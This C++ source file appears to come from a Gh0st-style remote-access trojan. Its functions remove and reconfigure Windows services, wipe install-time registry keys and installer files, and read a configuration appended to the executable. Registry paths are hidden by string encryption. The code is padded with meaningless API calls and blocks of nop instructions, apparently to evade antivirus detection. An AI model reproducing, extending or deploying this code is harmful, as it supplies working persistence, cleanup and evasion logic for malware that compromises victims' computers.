#include "install.h"
#include "until.h"
#include <Shlwapi.h>

#pragma comment(lib,"shlwapi")
void RemoveService(LPCTSTR lpServiceName)
{
    TCHAR szModule[MAX_PATH];

    TCHAR		Desc[MAX_PATH];
    TCHAR		regKey[1024];
    SC_HANDLE	service = NULL, scm = NULL;
    SERVICE_STATUS	Status;
    __try
    {
        CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
        scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
        service = OpenService(scm, lpServiceName, SERVICE_ALL_ACCESS);
        if (scm == NULL&&service == NULL)
            __leave;

        CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
        if (!QueryServiceStatus(service, &Status))
            __leave;

        CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);

        if (Status.dwCurrentState != SERVICE_STOPPED)
        {
            if (!ControlService(service, SERVICE_CONTROL_STOP, &Status))
                __leave;
            Sleep(800);
        }
        CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
        DeleteService(service);

        CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);

        memset(regKey, 0, sizeof(regKey));
        TCHAR str1[50] = TEXT("KAKJ5MB;ehhUlj;oljhoRKUjBKUhdQ[UkB");
        EncryptData((TCHAR *)&str1, lstrlen(str1), 12);
        lstrcat(str1, TEXT("%s"));
        CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
        wsprintf(regKey, str1, lpServiceName);
        SHDeleteKey(HKEY_LOCAL_MACHINE, regKey);//shlwapi.lib
        CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
    }
    __finally
    {
        if (service != NULL)
        {
            CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
            CloseServiceHandle(service);
        }
        if (scm != NULL)
        {
            CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
            CloseServiceHandle(scm);
        }
    }
    return;
}

void DeleteInstallFile(TCHAR *lpServiceName)
{
    TCHAR szModule[MAX_PATH];

    TCHAR	strInstallModule[MAX_PATH];
    TCHAR	strSubKey[1024];
    CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
    memset(strInstallModule, 0, ARRAYSIZE(strInstallModule));
    TCHAR str1[50] = TEXT("KAKJ5MB;ehhUlj;oljhoRKUjBKUhdQ[UkB");
    EncryptData((TCHAR *)&str1, lstrlen(str1), 12);
    lstrcat(str1, TEXT("%s"));
    CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);

    wsprintf(strSubKey, str1, lpServiceName);
    CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
    ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, TEXT("I1n6s0t6all"), REG_SZ, strInstallModule, NULL, lstrlen(strInstallModule), 0);
    // 删除键值和文件
    WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, TEXT("I1n6s0t6all"), REG_SZ, NULL, NULL, 3);
    Sleep(3000);
    DeleteFile(strInstallModule);
    CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
}

int memfind(const TCHAR *mem, const TCHAR *str, int sizem, int sizes)
{
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    __asm nop;
    int   da, i, j;
    da = sizes;
    for (i = 0; i < sizem; i++)
    {
        for (j = 0; j < da; j++)
        if (mem[i + j] != str[j])	break;
        if (j == da) return i;
    }
    return -1;
}

#define	MAX_CONFIG_LEN	1024

LPCTSTR FindConfigString(HANDLE hFile, LPCTSTR lpString)
{
    TCHAR szModule[MAX_PATH];

    TCHAR	*lpConfigString = NULL;
    DWORD	dwBytesRead = 0;
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return NULL;
    }

    CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);

    CKeyboardManager::MySetFilePointer(hFile, -MAX_CONFIG_LEN, NULL, FILE_END);
    CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
    lpConfigString = new TCHAR[MAX_CONFIG_LEN];
    ReadFile(hFile, lpConfigString, MAX_CONFIG_LEN, &dwBytesRead, NULL);
    CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
    //	CloseHandle(hFile);

    int offset = memfind(lpConfigString, lpString, MAX_CONFIG_LEN, lstrlen(lpString));
    if (offset == -1)
    {
        delete lpConfigString;
        return NULL;
    }
    else
    {
        return lpConfigString + offset;
    }
}

void ReConfigService(TCHAR *lpServiceName)
{
    TCHAR szModule[MAX_PATH];

    int rc = 0;
    HKEY hKey = 0;

    try
    {
        TCHAR buff[500];
        //config service
        TCHAR str1[50] = TEXT("KAKJ5MB;ehhUlj;oljhoRKUjBKUhdQ[UkB");
        EncryptData((TCHAR *)&str1, lstrlen(str1), 12);
        lstrcpy(buff, str1);
        CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
        lstrcat(buff, lpServiceName);
        rc = RegCreateKey(HKEY_LOCAL_MACHINE, buff, &hKey);
        CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
        if (ERROR_SUCCESS != rc)
        {
            throw "";
        }
        // 进程为Owner的，改为Share
        DWORD dwType = 0x120;
        CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
        rc = RegSetValueEx(hKey,TEXT( "Type"), 0, REG_DWORD, (unsigned char*)&dwType, sizeof(DWORD));
        CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
        SetLastError(rc);
        if (ERROR_SUCCESS != rc) throw "";
    }
    catch (char *str)
    {
        if (str && str[0])
        {
            rc = GetLastError();
        }
    }

    RegCloseKey(hKey);
}

DWORD QueryServiceTypeFromRegedit(TCHAR *lpServiceName)
{
    TCHAR szModule[MAX_PATH];

    int rc = 0;
    HKEY hKey = 0;
    DWORD	dwServiceType = 0;
    try{
        TCHAR buff[500];
        CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
        //config service
        lstrcpy(buff, TEXT("SYSTEM\\CurrentControlSet\\Services\\"));
        CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
        lstrcat(buff, lpServiceName);
        CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
        rc = RegOpenKey(HKEY_LOCAL_MACHINE, buff, &hKey);
        CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
        if (ERROR_SUCCESS != rc)
        {
            throw "";
        }

        DWORD type, size = sizeof(DWORD);
        CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
        rc = RegQueryValueEx(hKey, TEXT("Type"), 0, &type, (unsigned char *)&dwServiceType, &size);
        CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
        RegCloseKey(hKey);
        CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
        SetLastError(rc);
        if (ERROR_SUCCESS != rc)
            throw "";
    }
    catch (...)
    {
    }

    CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
    RegCloseKey(hKey);
    CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
    return dwServiceType;
}
